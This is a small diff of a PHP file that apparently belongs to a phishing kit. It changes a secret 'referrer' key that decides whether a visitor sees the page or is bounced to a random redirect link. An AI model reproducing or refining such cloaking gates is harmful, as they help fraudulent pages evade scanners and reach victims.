@@ -6,7 +6,7 @@ ini_set('display_errors', 0);
 
 /*===[Security Setup]=========================================*/
 include './config.php';
-if ($_GET['referrer'] != "had3s") { 
+if ($_GET['referrer'] != "Skchk") { 
 	$i = rand(0,sizeof($red_link));
     header("location: $red_link[$i]");
 	exit();
